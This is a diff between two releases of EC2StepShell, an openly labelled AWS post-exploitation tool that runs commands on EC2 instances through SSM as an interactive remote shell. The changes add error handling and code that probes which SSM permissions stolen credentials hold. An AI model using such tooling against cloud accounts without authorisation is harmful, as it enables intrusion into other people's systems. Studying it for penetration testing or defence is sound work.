# Comparing `tmp/EC2StepShell-1.0.2.tar.gz` & `tmp/EC2StepShell-1.1.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "EC2StepShell-1.0.2.tar", last modified: Tue Feb 14 07:59:30 2023, max compression
+gzip compressed data, was "EC2StepShell-1.1.0.tar", last modified: Fri Apr  7 07:54:42 2023, max compression
```

## Comparing `EC2StepShell-1.0.2.tar` & `EC2StepShell-1.1.0.tar`

### file list

```diff
@@ -1,36 +1,36 @@
-drwxrwxrwx   0        0        0        0 2023-02-14 07:59:30.247437 EC2StepShell-1.0.2/
--rw-rw-rw-   0        0        0      275 2023-02-14 07:58:48.000000 EC2StepShell-1.0.2/CHANGELOG.txt
-drwxrwxrwx   0        0        0        0 2023-02-14 07:59:30.221522 EC2StepShell-1.0.2/EC2StepShell.egg-info/
--rw-rw-rw-   0        0        0      620 2023-02-12 14:45:17.000000 EC2StepShell-1.0.2/EC2StepShell.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-02-12 14:45:17.000000 EC2StepShell-1.0.2/EC2StepShell.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       58 2023-02-12 14:45:17.000000 EC2StepShell-1.0.2/EC2StepShell.egg-info/entry_points.txt
--rw-rw-rw-   0        0        0       34 2023-02-12 14:45:17.000000 EC2StepShell-1.0.2/EC2StepShell.egg-info/requires.txt
--rw-rw-rw-   0        0        0       13 2023-02-12 14:45:17.000000 EC2StepShell-1.0.2/EC2StepShell.egg-info/top_level.txt
--rw-rw-rw-   0        0        0     1060 2023-02-12 10:55:59.000000 EC2StepShell-1.0.2/LICENCE.txt
--rw-rw-rw-   0        0        0       81 2023-02-12 14:39:48.000000 EC2StepShell-1.0.2/MANIFEST.in
--rw-rw-rw-   0        0        0     6841 2023-02-14 07:59:30.246440 EC2StepShell-1.0.2/PKG-INFO
--rw-rw-rw-   0        0        0     4967 2023-02-14 07:36:14.000000 EC2StepShell-1.0.2/README.md
--rw-rw-rw-   0        0        0      994 2023-02-14 07:58:53.000000 EC2StepShell-1.0.2/pyproject.toml
--rw-rw-rw-   0        0        0      664 2023-02-12 14:43:04.000000 EC2StepShell-1.0.2/requirements.txt
--rw-rw-rw-   0        0        0       42 2023-02-14 07:59:30.247437 EC2StepShell-1.0.2/setup.cfg
-drwxrwxrwx   0        0        0        0 2023-02-14 07:59:30.206571 EC2StepShell-1.0.2/src/
-drwxrwxrwx   0        0        0        0 2023-02-14 07:59:30.235474 EC2StepShell-1.0.2/src/EC2StepShell.egg-info/
--rw-rw-rw-   0        0        0     6841 2023-02-14 07:59:30.000000 EC2StepShell-1.0.2/src/EC2StepShell.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      810 2023-02-14 07:59:30.000000 EC2StepShell-1.0.2/src/EC2StepShell.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-02-14 07:59:30.000000 EC2StepShell-1.0.2/src/EC2StepShell.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       58 2023-02-14 07:59:30.000000 EC2StepShell-1.0.2/src/EC2StepShell.egg-info/entry_points.txt
--rw-rw-rw-   0        0        0       34 2023-02-14 07:59:30.000000 EC2StepShell-1.0.2/src/EC2StepShell.egg-info/requires.txt
--rw-rw-rw-   0        0        0       13 2023-02-14 07:59:30.000000 EC2StepShell-1.0.2/src/EC2StepShell.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-02-14 07:59:30.236472 EC2StepShell-1.0.2/src/ec2stepshell/
--rw-rw-rw-   0        0        0      354 2023-02-12 15:25:15.000000 EC2StepShell-1.0.2/src/ec2stepshell/__init__.py
--rw-rw-rw-   0        0        0      683 2023-02-12 15:28:11.000000 EC2StepShell-1.0.2/src/ec2stepshell/__main__.py
-drwxrwxrwx   0        0        0        0 2023-02-14 07:59:30.242454 EC2StepShell-1.0.2/src/ec2stepshell/core/
--rw-rw-rw-   0        0        0     9360 2023-02-14 07:58:36.000000 EC2StepShell-1.0.2/src/ec2stepshell/core/ReverseShell.py
-drwxrwxrwx   0        0        0        0 2023-02-14 07:59:30.243450 EC2StepShell-1.0.2/src/ec2stepshell/ssm/
--rw-rw-rw-   0        0        0     1880 2023-02-12 15:28:47.000000 EC2StepShell-1.0.2/src/ec2stepshell/ssm/SsmWrapper.py
-drwxrwxrwx   0        0        0        0 2023-02-14 07:59:30.245443 EC2StepShell-1.0.2/src/ec2stepshell/utils/
--rw-rw-rw-   0        0        0     5042 2023-02-12 15:39:38.000000 EC2StepShell-1.0.2/src/ec2stepshell/utils/ArgumentsHandler.py
--rw-rw-rw-   0        0        0      518 2023-02-12 15:28:22.000000 EC2StepShell-1.0.2/src/ec2stepshell/utils/CommandOutput.py
--rw-rw-rw-   0        0        0     1147 2023-02-01 13:57:56.000000 EC2StepShell-1.0.2/src/ec2stepshell/utils/constants.py
-drwxrwxrwx   0        0        0        0 2023-02-14 07:59:30.246440 EC2StepShell-1.0.2/src/ec2stepshell/utils/terminal/
--rw-rw-rw-   0        0        0     1645 2023-02-12 15:28:40.000000 EC2StepShell-1.0.2/src/ec2stepshell/utils/terminal/TerminalEmulator.py
+drwxrwxrwx   0        0        0        0 2023-04-07 07:54:42.643750 EC2StepShell-1.1.0/
+-rw-rw-rw-   0        0        0      411 2023-04-07 06:26:29.000000 EC2StepShell-1.1.0/CHANGELOG.txt
+drwxrwxrwx   0        0        0        0 2023-04-07 07:54:42.626766 EC2StepShell-1.1.0/EC2StepShell.egg-info/
+-rw-rw-rw-   0        0        0      620 2023-02-12 14:45:17.000000 EC2StepShell-1.1.0/EC2StepShell.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-02-12 14:45:17.000000 EC2StepShell-1.1.0/EC2StepShell.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       58 2023-02-12 14:45:17.000000 EC2StepShell-1.1.0/EC2StepShell.egg-info/entry_points.txt
+-rw-rw-rw-   0        0        0       34 2023-02-12 14:45:17.000000 EC2StepShell-1.1.0/EC2StepShell.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       13 2023-02-12 14:45:17.000000 EC2StepShell-1.1.0/EC2StepShell.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0     1060 2023-02-12 10:55:59.000000 EC2StepShell-1.1.0/LICENCE.txt
+-rw-rw-rw-   0        0        0       81 2023-02-12 14:39:48.000000 EC2StepShell-1.1.0/MANIFEST.in
+-rw-rw-rw-   0        0        0     7020 2023-04-07 07:54:42.642750 EC2StepShell-1.1.0/PKG-INFO
+-rw-rw-rw-   0        0        0     5146 2023-04-07 06:27:31.000000 EC2StepShell-1.1.0/README.md
+-rw-rw-rw-   0        0        0      994 2023-04-07 06:27:35.000000 EC2StepShell-1.1.0/pyproject.toml
+-rw-rw-rw-   0        0        0      664 2023-02-12 14:43:04.000000 EC2StepShell-1.1.0/requirements.txt
+-rw-rw-rw-   0        0        0       42 2023-04-07 07:54:42.643750 EC2StepShell-1.1.0/setup.cfg
+drwxrwxrwx   0        0        0        0 2023-04-07 07:54:42.605749 EC2StepShell-1.1.0/src/
+drwxrwxrwx   0        0        0        0 2023-04-07 07:54:42.632750 EC2StepShell-1.1.0/src/EC2StepShell.egg-info/
+-rw-rw-rw-   0        0        0     7020 2023-04-07 07:54:42.000000 EC2StepShell-1.1.0/src/EC2StepShell.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      810 2023-04-07 07:54:42.000000 EC2StepShell-1.1.0/src/EC2StepShell.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-07 07:54:42.000000 EC2StepShell-1.1.0/src/EC2StepShell.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       58 2023-04-07 07:54:42.000000 EC2StepShell-1.1.0/src/EC2StepShell.egg-info/entry_points.txt
+-rw-rw-rw-   0        0        0       34 2023-04-07 07:54:42.000000 EC2StepShell-1.1.0/src/EC2StepShell.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       13 2023-04-07 07:54:42.000000 EC2StepShell-1.1.0/src/EC2StepShell.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-04-07 07:54:42.633749 EC2StepShell-1.1.0/src/ec2stepshell/
+-rw-rw-rw-   0        0        0      354 2023-02-12 15:25:15.000000 EC2StepShell-1.1.0/src/ec2stepshell/__init__.py
+-rw-rw-rw-   0        0        0      683 2023-04-07 07:22:41.000000 EC2StepShell-1.1.0/src/ec2stepshell/__main__.py
+drwxrwxrwx   0        0        0        0 2023-04-07 07:54:42.634750 EC2StepShell-1.1.0/src/ec2stepshell/core/
+-rw-rw-rw-   0        0        0    11467 2023-04-07 07:36:41.000000 EC2StepShell-1.1.0/src/ec2stepshell/core/ReverseShell.py
+drwxrwxrwx   0        0        0        0 2023-04-07 07:54:42.639759 EC2StepShell-1.1.0/src/ec2stepshell/ssm/
+-rw-rw-rw-   0        0        0     3140 2023-04-07 07:51:10.000000 EC2StepShell-1.1.0/src/ec2stepshell/ssm/SsmWrapper.py
+drwxrwxrwx   0        0        0        0 2023-04-07 07:54:42.641750 EC2StepShell-1.1.0/src/ec2stepshell/utils/
+-rw-rw-rw-   0        0        0     5042 2023-04-07 05:04:16.000000 EC2StepShell-1.1.0/src/ec2stepshell/utils/ArgumentsHandler.py
+-rw-rw-rw-   0        0        0      518 2023-02-12 15:28:22.000000 EC2StepShell-1.1.0/src/ec2stepshell/utils/CommandOutput.py
+-rw-rw-rw-   0        0        0     1147 2023-02-01 13:57:56.000000 EC2StepShell-1.1.0/src/ec2stepshell/utils/constants.py
+drwxrwxrwx   0        0        0        0 2023-04-07 07:54:42.641750 EC2StepShell-1.1.0/src/ec2stepshell/utils/terminal/
+-rw-rw-rw-   0        0        0     1645 2023-02-12 15:28:40.000000 EC2StepShell-1.1.0/src/ec2stepshell/utils/terminal/TerminalEmulator.py
```

### Comparing `EC2StepShell-1.0.2/EC2StepShell.egg-info/SOURCES.txt` & `EC2StepShell-1.1.0/EC2StepShell.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `EC2StepShell-1.0.2/LICENCE.txt` & `EC2StepShell-1.1.0/LICENCE.txt`

 * *Files identical despite different names*

### Comparing `EC2StepShell-1.0.2/PKG-INFO` & `EC2StepShell-1.1.0/PKG-INFO`

 * *Files 10% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: EC2StepShell
-Version: 1.0.2
+Version: 1.1.0
 Summary: EC2StepShell is an AWS post-exploitation tool for getting reverse shells in public or private EC2 instances
 Author-email: Eduard Agavriloae <saw-your-packet@breakingbreakpoints.com>
 License: Copyright 2023 saw-your-packet
         
         Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
         
         The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
@@ -23,39 +23,40 @@
 License-File: LICENCE.txt
 
 # EC2StepShell
 
 EC2StepShell is an AWS post-exploitation tool for getting high privileges reverse shells in public or private EC2 instances.
 It works by sending commands to EC2 instances using ssm:SendCommand and then retrieves the output using ssm:ListCommandInvocations.
 
+More details about how the tool works can be found here: https://securitycafe.ro/2023/03/08/ec2stepshell-reverse-shells-private-ec2-instances/
+
 ## Installation
 
 ```bash
 python -m pip install EC2StepShell
 ```
 
 ## Usage
 
 If you target a public EC2 instance, you might be able to get a reverse shell using well known payloads. However, the tool shines for the cases when the instance is in a private network or its security groups don't allow communications with your IP.
 
-![short-demo-ec2stepshell](https://user-images.githubusercontent.com/38787278/218664059-b414e5f3-2d8b-4a6d-a48e-7f085d98d772.gif)
-
+![zoomed-short-demo-ec2stepshell](https://user-images.githubusercontent.com/38787278/219875886-05f367af-6782-4137-bd49-8e1b78652c36.gif)
 
 ```bash
 python -m ec2stepshell -h
 ```
 
 ![help-menu](https://user-images.githubusercontent.com/38787278/218660321-cbf2da28-b9e6-4727-9643-697cf5857ce3.png)
 
 ### Requirements
 
 - You need a programmatic access within the account (temporary/persistent access credentials)
 - You need two permissions:
   - ssm:SendCommand
-  - ssm:ListCommandInvocations
+  - ssm:ListCommandInvocations or ssm:GetCommandInvocation
 
 The action ssm:SendCommand must be granted over the target EC2 instance and the documents:
 - AWS-RunShellScript
 - AWS-RunPowerShellScript
 
 You might not be able to verify this. In most cases of misconfigurations, ssm:SendCommand will be granted with `*`, but if you receive access denied and you're sure that the instance id is correct, then this might be the issue.
```

### Comparing `EC2StepShell-1.0.2/README.md` & `EC2StepShell-1.1.0/README.md`

 * *Files 4% similar despite different names*

```diff
@@ -1,37 +1,38 @@
 # EC2StepShell
 
 EC2StepShell is an AWS post-exploitation tool for getting high privileges reverse shells in public or private EC2 instances.
 It works by sending commands to EC2 instances using ssm:SendCommand and then retrieves the output using ssm:ListCommandInvocations.
 
+More details about how the tool works can be found here: https://securitycafe.ro/2023/03/08/ec2stepshell-reverse-shells-private-ec2-instances/
+
 ## Installation
 
 ```bash
 python -m pip install EC2StepShell
 ```
 
 ## Usage
 
 If you target a public EC2 instance, you might be able to get a reverse shell using well known payloads. However, the tool shines for the cases when the instance is in a private network or its security groups don't allow communications with your IP.
 
-![short-demo-ec2stepshell](https://user-images.githubusercontent.com/38787278/218664059-b414e5f3-2d8b-4a6d-a48e-7f085d98d772.gif)
-
+![zoomed-short-demo-ec2stepshell](https://user-images.githubusercontent.com/38787278/219875886-05f367af-6782-4137-bd49-8e1b78652c36.gif)
 
 ```bash
 python -m ec2stepshell -h
 ```
 
 ![help-menu](https://user-images.githubusercontent.com/38787278/218660321-cbf2da28-b9e6-4727-9643-697cf5857ce3.png)
 
 ### Requirements
 
 - You need a programmatic access within the account (temporary/persistent access credentials)
 - You need two permissions:
   - ssm:SendCommand
-  - ssm:ListCommandInvocations
+  - ssm:ListCommandInvocations or ssm:GetCommandInvocation
 
 The action ssm:SendCommand must be granted over the target EC2 instance and the documents:
 - AWS-RunShellScript
 - AWS-RunPowerShellScript
 
 You might not be able to verify this. In most cases of misconfigurations, ssm:SendCommand will be granted with `*`, but if you receive access denied and you're sure that the instance id is correct, then this might be the issue.
```

### Comparing `EC2StepShell-1.0.2/pyproject.toml` & `EC2StepShell-1.1.0/pyproject.toml`

 * *Files 1% similar despite different names*

```diff
@@ -1,14 +1,14 @@
 [build-system]
 requires = ["setuptools>=61.0.0"]
 build-backend = "setuptools.build_meta"
 
 [project]
 name = "EC2StepShell"
-version = "1.0.2"
+version = "1.1.0"
 description = "EC2StepShell is an AWS post-exploitation tool for getting reverse shells in public or private EC2 instances"
 readme = "README.md"
 authors = [{name = "Eduard Agavriloae", email = "saw-your-packet@breakingbreakpoints.com"}]
 license = {file = "LICENCE.txt" }
 classifiers = [
     "Development Status :: 5 - Production/Stable",
     "Intended Audience :: Information Technology",
```

### Comparing `EC2StepShell-1.0.2/requirements.txt` & `EC2StepShell-1.1.0/requirements.txt`

 * *Files identical despite different names*

### Comparing `EC2StepShell-1.0.2/src/EC2StepShell.egg-info/PKG-INFO` & `EC2StepShell-1.1.0/src/EC2StepShell.egg-info/PKG-INFO`

 * *Files 10% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: EC2StepShell
-Version: 1.0.2
+Version: 1.1.0
 Summary: EC2StepShell is an AWS post-exploitation tool for getting reverse shells in public or private EC2 instances
 Author-email: Eduard Agavriloae <saw-your-packet@breakingbreakpoints.com>
 License: Copyright 2023 saw-your-packet
         
         Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
         
         The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
@@ -23,39 +23,40 @@
 License-File: LICENCE.txt
 
 # EC2StepShell
 
 EC2StepShell is an AWS post-exploitation tool for getting high privileges reverse shells in public or private EC2 instances.
 It works by sending commands to EC2 instances using ssm:SendCommand and then retrieves the output using ssm:ListCommandInvocations.
 
+More details about how the tool works can be found here: https://securitycafe.ro/2023/03/08/ec2stepshell-reverse-shells-private-ec2-instances/
+
 ## Installation
 
 ```bash
 python -m pip install EC2StepShell
 ```
 
 ## Usage
 
 If you target a public EC2 instance, you might be able to get a reverse shell using well known payloads. However, the tool shines for the cases when the instance is in a private network or its security groups don't allow communications with your IP.
 
-![short-demo-ec2stepshell](https://user-images.githubusercontent.com/38787278/218664059-b414e5f3-2d8b-4a6d-a48e-7f085d98d772.gif)
-
+![zoomed-short-demo-ec2stepshell](https://user-images.githubusercontent.com/38787278/219875886-05f367af-6782-4137-bd49-8e1b78652c36.gif)
 
 ```bash
 python -m ec2stepshell -h
 ```
 
 ![help-menu](https://user-images.githubusercontent.com/38787278/218660321-cbf2da28-b9e6-4727-9643-697cf5857ce3.png)
 
 ### Requirements
 
 - You need a programmatic access within the account (temporary/persistent access credentials)
 - You need two permissions:
   - ssm:SendCommand
-  - ssm:ListCommandInvocations
+  - ssm:ListCommandInvocations or ssm:GetCommandInvocation
 
 The action ssm:SendCommand must be granted over the target EC2 instance and the documents:
 - AWS-RunShellScript
 - AWS-RunPowerShellScript
 
 You might not be able to verify this. In most cases of misconfigurations, ssm:SendCommand will be granted with `*`, but if you receive access denied and you're sure that the instance id is correct, then this might be the issue.
```

### Comparing `EC2StepShell-1.0.2/src/EC2StepShell.egg-info/SOURCES.txt` & `EC2StepShell-1.1.0/src/EC2StepShell.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `EC2StepShell-1.0.2/src/ec2stepshell/__main__.py` & `EC2StepShell-1.1.0/src/ec2stepshell/__main__.py`

 * *Files identical despite different names*

### Comparing `EC2StepShell-1.0.2/src/ec2stepshell/core/ReverseShell.py` & `EC2StepShell-1.1.0/src/ec2stepshell/core/ReverseShell.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,12 +1,13 @@
 import os
 import re
 import traceback
 from termcolor import cprint
 from time import sleep
+from botocore.exceptions import ClientError
 from ec2stepshell.ssm.SsmWrapper import SsmWrapper
 from ec2stepshell.utils.constants import const, user_config
 from ec2stepshell.utils.terminal.TerminalEmulator import TerminalEmulator
 
 
 class ReverseShell:
     def __init__(self, profile, access_key, secret_key, token, region):
@@ -14,17 +15,23 @@
             profile=profile,
             access_key=access_key,
             secret_key=secret_key,
             token=token,
             region=region
         )
         self.queue = {}
+        self.use_list_command_invocations = False
 
     def start_shell(self, instance_id):
         cprint('[x] Starting reverse shell on EC2 instance ' + instance_id, 'blue')
+        cprint('[x] Determining method for retrieving output', 'blue')
+
+        # true - list_command_invocations will be used
+        # false - get_command_invocation will be used
+        self.use_list_command_invocations = self.determine_retrieve_method()
         self.determine_os(instance_id, user_config['os'])
 
         terminal_emulator = self.get_shell_display(instance_id, user_config['os'])
 
         while True:
             command = input(terminal_emulator.shell_display)
 
@@ -66,27 +73,35 @@
                 cprint(f'[!] An unknown local error occurred when running the given command. Help me improve the tool by creating an issue on GitHub with the error message.', 'red')
                 traceback.print_exc()
   
 
     def get_shell_display(self, instance_id, os):
         cprint('\n[x] Retrieving hostname', 'blue')
 
-        hostname_obj = self.send_command_and_get_output(
-            document=const[os]['document'],
-            command='hostname',
-            instance_id=instance_id,
-            directory='.'
-        )
+        try:
+            hostname_obj = self.send_command_and_get_output(
+                document=const[os]['document'],
+                command='hostname',
+                instance_id=instance_id,
+                directory='.'
+            )
 
-        if hostname_obj is None:
-            cprint('[!] Hostname not retrieved. Try running with increased delay.', 'red')
-            exit()
+            if hostname_obj is None:
+                cprint('[!] Hostname not retrieved. Try running with increased delay.', 'red')
+                exit()
+
+            hostname = hostname_obj.output.replace('\n', '')
+            cprint('\t Hostname: ' + hostname, 'blue')
+        except ClientError as ex:
+            if ex.response['Error']['Code'] == 'AccessDeniedException':
+                cprint("[!] Permission ssm:SendCommand is denied.", 'red')
+                cprint("[!] Execution can not continue.", 'red')
+                cprint("[x] Exit...", 'blue')
+                exit()
 
-        hostname = hostname_obj.output.replace('\n', '')
-        cprint('\t Hostname: ' + hostname, 'blue')
 
         cprint('[x] Retrieving working directory', 'blue')
 
         pwd_obj = self.send_command_and_get_output(
             document=const[os]['document'],
             command='pwd',
             instance_id=instance_id,
@@ -131,15 +146,20 @@
             if retries >= user_config['max_retries']:
                 cprint(f'[!] Maximum number of retries reached for command id {command_id}', 'red')
                 cprint(f'[x] You can manually retry to get the output with \'!retry {command_id}\'', 'blue')
                 cprint('[x] To view all commands that were not finished: \'!showqueue\'', 'blue')
                 self.queue[command_id] = command
                 break
 
-            output_command = self.ssm_wrapper.get_execution_output(command_id=command_id)
+            output_command = self.ssm_wrapper.get_execution_output(
+                command_id=command_id,
+                use_list_commands=self.use_list_command_invocations,
+                instance_id=instance_id
+                )
+            
             execution_finished = output_command.is_execution_finished()
 
             if execution_finished == False:
                 sleep(user_config['retry_sleep'])
                 retries += 1
                 continue
 
@@ -213,15 +233,15 @@
             os = 'linux'
 
         try:
             output = self.send_command_and_get_output(
                 document=const[os]['document'],
                 command='whoami',
                 instance_id=instance_id,
-                directory='.',
+                directory='.'
             )
  
             if output is None:
                 cprint('[!] An error occurred. Increase delay or manually specify OS','red')
                 exit()
 
             if output.status == const['general']['command_statuses']['failed']:
@@ -240,8 +260,31 @@
                 return
 
             if e.response['Error']['Code'] == 'InvalidInstanceId':
                 cprint(f'[!] Instance id is wrong or can\'t communicate with SSM', 'red')
                 exit()
 
 
-        
+    def determine_retrieve_method(self):
+        has_list_permissions = self.ssm_wrapper.has_list_permissions()
+
+        if has_list_permissions:
+            cprint('[x] Permission ssm:ListCommandInvocations granted', 'blue')
+            cprint('[x] Using ssm:ListCommandInvocations as command output retrieve method', 'blue')
+
+            return True
+        
+        cprint('[~] Permission ssm:ListCommandInvocations denied', 'yellow')
+        cprint('[~] Checking permission for ssm:GetCommandInvocation', 'yellow')
+
+        has_get_permissions = self.ssm_wrapper.has_get_permissions()
+
+        if has_get_permissions:
+            cprint('[x] Permission ssm:GetCommandInvocation granted', 'blue')
+            cprint('[x] Using ssm:GetCommandInvocation as command output retrieve method', 'blue')
+
+            return False
+        
+        cprint('[~] Permission ssm:GetCommandInvocation denied', 'yellow')
+        cprint("[!] You don't have permissions to get the output of the command. Try some payloads relying only on ssm:SendCommand as described here: https://securitycafe.ro/2023/04/17/7-lesser-known-aws-ssm-document-techniques-for-code-execution/", 'red')
+        
+        exit()
```

### Comparing `EC2StepShell-1.0.2/src/ec2stepshell/ssm/SsmWrapper.py` & `EC2StepShell-1.1.0/src/ec2stepshell/ssm/SsmWrapper.py`

 * *Files 26% similar despite different names*

```diff
@@ -1,8 +1,9 @@
 import boto3
+from botocore.exceptions import ClientError
 from ec2stepshell.utils.CommandOutput import CommandOutput
 
 class SsmWrapper:
     def __init__(self, profile, access_key, secret_key, token, region):
         session = None
 
         if profile is not None and profile != '':
@@ -41,19 +42,56 @@
         )
 
         command_id = response['Command']['CommandId']
         
         return command_id
 
 
-    def get_execution_output(self, command_id):
-        response = self.client.list_command_invocations(
-            CommandId = command_id,
-            Details = True
-        )
+    def get_execution_output(self, command_id, use_list_commands=True, instance_id=''):
+        response = status = output = None
+
+        if use_list_commands == True:
+            response = self.client.list_command_invocations(
+                CommandId = command_id,
+                Details = True
+            )
+
+            status = response['CommandInvocations'][0]['CommandPlugins'][0]['Status']
+            output = response['CommandInvocations'][0]['CommandPlugins'][0]['Output']
+        else:
+            response = self.client.get_command_invocation(
+                CommandId = command_id,
+                InstanceId = instance_id
+            )
+
+            status = response['Status']
+            output = response['StandardOutputContent']
 
-        status = response['CommandInvocations'][0]['CommandPlugins'][0]['Status']
-        output = response['CommandInvocations'][0]['CommandPlugins'][0]['Output']
-        
         command_output = CommandOutput(status, output)
 
         return command_output
+    
+    
+    def has_list_permissions(self):
+        try:
+            self.client.list_command_invocations(
+                CommandId = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa',
+                Details = True
+            )
+        except ClientError as ex:
+            if ex.response['Error']['Code'] == 'AccessDeniedException':
+                return False
+
+        return True
+
+    
+    def has_get_permissions(self):
+        try:
+            self.client.get_command_invocation(
+                CommandId = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa',
+                InstanceId = 'i-aaaaaaaaaaaaaaaaa'
+            )
+        except ClientError as ex:
+            if ex.response['Error']['Code'] == 'AccessDeniedException':
+                return False
+        
+        return True
```

### Comparing `EC2StepShell-1.0.2/src/ec2stepshell/utils/ArgumentsHandler.py` & `EC2StepShell-1.1.0/src/ec2stepshell/utils/ArgumentsHandler.py`

 * *Files 1% similar despite different names*

```diff
@@ -76,15 +76,15 @@
 
         parser = argparse.ArgumentParser(
             description="Getting reverse shells into EC2 instances, even if you don't have network connectivity to them.",
             epilog="Additional commands are available after a shell is established. Once the shell started, type '!help' to access them.",
             prog="python3 -m ec2stepshell"
         )
 
-        cprint("Author: Eduard Agavriloae\n\t@saw-your-packet\n\teduard@breakingbreakpoints.com\n", "magenta")
+        cprint("Author: Eduard Agavriloae\n\t@saw_your_packet\n\teduard@breakingbreakpoints.com\n", "magenta")
 
         parser.add_argument('instance', help='the ID of the target EC2 instance')
 
         profile = parser.add_argument_group()
         profile.add_argument("-p", "--profile", help="profile to use from AWS CLI")
 
         access_keys = parser.add_argument_group()
```

### Comparing `EC2StepShell-1.0.2/src/ec2stepshell/utils/CommandOutput.py` & `EC2StepShell-1.1.0/src/ec2stepshell/utils/CommandOutput.py`

 * *Files identical despite different names*

### Comparing `EC2StepShell-1.0.2/src/ec2stepshell/utils/constants.py` & `EC2StepShell-1.1.0/src/ec2stepshell/utils/constants.py`

 * *Files identical despite different names*

### Comparing `EC2StepShell-1.0.2/src/ec2stepshell/utils/terminal/TerminalEmulator.py` & `EC2StepShell-1.1.0/src/ec2stepshell/utils/terminal/TerminalEmulator.py`

 * *Files identical despite different names*

